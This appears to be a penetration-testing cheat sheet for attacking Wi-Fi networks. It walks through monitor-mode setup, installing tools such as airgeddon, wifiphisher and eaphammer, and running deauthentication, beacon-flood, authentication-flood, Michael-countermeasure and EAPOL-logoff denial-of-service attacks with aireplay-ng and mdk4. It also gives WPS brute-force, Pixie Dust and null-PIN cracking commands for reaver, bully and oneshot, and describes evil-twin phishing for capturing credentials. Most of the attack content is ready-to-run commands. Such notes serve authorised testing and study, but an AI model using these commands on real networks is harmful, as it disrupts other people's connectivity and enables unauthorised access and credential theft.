# Wifi Basic Commands

```
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifi
```


# Tools

# EAP Hammer

```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```

# Airgeddon

```
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```

Run airgeddon with docker
```
docker run \
          --rm \
          -ti \
          --name airgeddon \
          --net=host \
          --privileged \
          -p 3000:3000 \
          -v /tmp:/io \
          -e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
          v1s1t0r1sh3r3/airgeddon
```
From: https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux

# wifiphisher

It can perform Evil Twin, KARMA, and Known Beacons attacks and then use a phishing template to manage to obtain the network real password or capture social network credentials.
```
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```

Wifite2

This tool automates WPS/WEP/WPA-PSK attacks. It will automatically:

    Set the interface in monitor mode

    Scan for possible networks - And let you select the victim(s)

    If WEP - Launch WEP attacks

    If WPA-PSK

        If WPS: Pixie dust attack and the bruteforce attack (be careful the brute-force attack could take a long time). Notice that it doesn't try null PIN or database/generated PINs.

        Try to capture the PMKID from the AP to crack it

        Try to deauthenticate clients of the AP to capture a handshake

        If PMKID or Handshake, try to bruteforce using top5000 passwords.

Attacks Summary

    DoS

        Deauthentication/disassociation -- Disconnect everyone (or a specific ESSID/Client)

        Random fake APs -- Hide nets, possible crash scanners

        Overload AP -- Try to kill the AP (usually not very useful)

        WIDS -- Play with the IDS

        TKIP, EAPOL -- Some specific attacks to DoS some APs

    Cracking

        Crack WEP (several tools and methods)

        WPA-PSK

            WPS pin "Brute-Force"

            WPA PMKID bruteforce

            [DoS +] WPA handshake capture + Cracking

        WPA-MGT

            Username capture

            Bruteforce Credentials

    Evil Twin (with or without DoS)

        Open Evil Twin [+ DoS] -- Useful to capture captive portal creds and/or perform LAN attacks

        WPA-PSK Evil Twin -- Useful to network attacks if you know the password

        WPA-MGT -- Useful to capture company credentials

    KARMA, MANA, Loud MANA, Known beacon

        + Open -- Useful to capture captive portal creds and/or perform LAN attacks

        + WPA -- Useful to capture WPA handshakes


DOS
Deauthentication Packets

Description from here:.

Deauthentication attacks, a prevalent method in Wi-Fi hacking, involve forging "management" frames to forcefully disconnect devices from a network. These unencrypted packets deceive clients into believing they are from the legitimate network, enabling attackers to collect WPA handshakes for cracking purposes or to persistently disrupt network connections. This tactic, alarming in its simplicity, is widely used and has significant implications for network security.

Deauthentication using Aireplay-ng

aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0

    -0 means deauthentication

    1 is the number of deauths to send (you can send multiple if you wish); 0 means send them continuously

    -a 00:14:6C:7E:40:80 is the MAC address of the access point

    -c 00:0F:B5:34:30:30 is the MAC address of the client to deauthenticate; if this is omitted then broadcast deauthentication is sent (not always work)

    ath0 is the interface name

Disassociation Packets

Disassociation packets, similar to deauthentication packets, are a type of management frame used in Wi-Fi networks. These packets serve to sever the connection between a device (such as a laptop or smartphone) and an access point (AP). The primary distinction between disassociation and deauthentication lies in their usage scenarios. While an AP emits deauthentication packets to remove rogue devices explicitly from the network, disassociation packets are typically sent when the AP is undergoing a shutdown, restart, or relocating, thereby necessitating the disconnection of all connected nodes.

This attack can be performed by mdk4(mode "d"):

# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them 
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F

More DOS attacks by mdk4

In here.

ATTACK MODE b: Beacon Flooding

Sends beacon frames to show fake APs at clients. This can sometimes crash network scanners and even drivers!

# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m

ATTACK MODE a: Authentication Denial-Of-Service

Sending authentication frames to all accessible Access Points (APs) within range can overload these APs, especially when numerous clients are involved. This intense traffic can lead to system instability, causing some APs to freeze or even reset.

# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m

ATTACK MODE p: SSID Probing and Bruteforcing

Probing Access Points (APs) checks if a SSID is properly revealed and confirms the AP's range. This technique, coupled with bruteforcing hidden SSIDs with or without a wordlist, helps in identifying and accessing concealed networks.

ATTACK MODE m: Michael Countermeasures Exploitation

Sending random or duplicate packets to different QoS queues can trigger Michael Countermeasures on TKIP APs, leading to a one-minute AP shutdown. This method is an efficient DoS (Denial of Service) attack tactic.

# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]

ATTACK MODE e: EAPOL Start and Logoff Packet Injection

Flooding an AP with EAPOL Start frames creates fake sessions, overwhelming the AP and blocking legitimate clients. Alternatively, injecting fake EAPOL Logoff messages forcibly disconnects clients, both methods effectively disrupt network service.

# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]

ATTACK MODE s: Attacks for IEEE 802.11s mesh networks

Various attacks on link management and routing in mesh networks.

ATTACK MODE w: WIDS Confusion

Cross-connecting clients to multiple WDS nodes or fake rogue APs can manipulate Intrusion Detection and Prevention Systems, creating confusion and potential system abuse.

# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]

ATTACK MODE f: Packet Fuzzer

A packet fuzzer featuring diverse packet sources and a comprehensive set of modifiers for packet manipulation.


Airggedon

Airgeddon offers most of the attacks proposed in the previous comments:
WPS

WPS (Wi-Fi Protected Setup) simplifies the process of connecting devices to a router, enhancing the setup speed and ease for networks encrypted with WPA or WPA2 Personal. It is ineffective for the easily compromised WEP security. WPS employs an 8-digit PIN, validated in two halves, making it susceptible to brute-force attacks due to its limited number of combinations (11,000 possibilities).
WPS Bruteforce

There are 2 main tools to perform this action: Reaver and Bully.

    Reaver has been designed to be a robust and practical attack against WPS, and has been tested against a wide variety of access points and WPS implementations.

    Bully is a new implementation of the WPS brute force attack, written in C. It has several advantages over the original reaver code: fewer dependencies, improved memory and cpu performance, correct handling of endianness, and a more robust set of options.

The attack exploits the WPS PIN's vulnerability, particularly its exposure of the first four digits and the last digit's role as a checksum, easing the brute-force attack. However, defenses against brute-force attacks, like blocking MAC addresses of aggressive attackers, demand MAC address rotation to continue the attack.

Upon obtaining the WPS PIN with tools like Bully or Reaver, the attacker can deduce the WPA/WPA2 PSK, ensuring persistent network access.

reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot    
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3

Smart Brute Force

This refined approach targets WPS PINs using known vulnerabilities:

    Pre-discovered PINs: Utilize a database of known PINs linked to specific manufacturers known to use uniform WPS PINs. This database correlates the first three octets of MAC-addresses with likely PINs for these manufacturers.

    PIN Generation Algorithms: Leverage algorithms like ComputePIN and EasyBox, which calculate WPS PINs based on the AP's MAC-address. The Arcadyan algorithm additionally requires a device ID, adding a layer to the PIN generation process.

WPS Pixie Dust attack

Dominique Bongard discovered a flaw in some Access Points (APs) concerning the creation of secret codes, known as nonces (E-S1 and E-S2). If these nonces can be figured out, cracking the AP's WPS PIN becomes easy. The AP reveals the PIN within a special code (hash) to prove it's legitimate and not a fake (rogue) AP. These nonces are essentially the "keys" to unlocking the "safe" that holds the WPS PIN. More on this can be found here.

In simple terms, the issue is that some APs did not use random enough keys for encrypting the PIN during the connection process. This makes the PIN vulnerable to being guessed from outside the network (offline brute force attack).

reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3

If you don't want to switch the device into monitor mode, or reaver and bully have some problem, you can try OneShot-C. This tools can performs Pixie Dust attack without having to switch to monitor mode.

./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37

Null Pin attack

Some poorly designed systems even let a Null PIN (an empty or nonexistent PIN) grant access, which is quite unusual. The tool Reaver is capable of testing for this vulnerability, unlike Bully.

 reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''

Airgeddon

All the proposed WPS attacks can be easily performed using airgeddon.

    5 and 6 lets you try your custom PIN (if you have any)

    7 and 8 perform the Pixie Dust attack

    13 allows you to test the NULL PIN

    11 and 12 will recollect the PINs related to the selected AP from available databases and generate possible PINs using: ComputePIN, EasyBox and optionally Arcadyan (recommended, why not?)

    9 and 10 will test every possible PIN

WEP

So broken and unused nowdays. Just know that airgeddon have a WEP option called "All-in-One" to attack this kind of protection. More tools offer similar options.
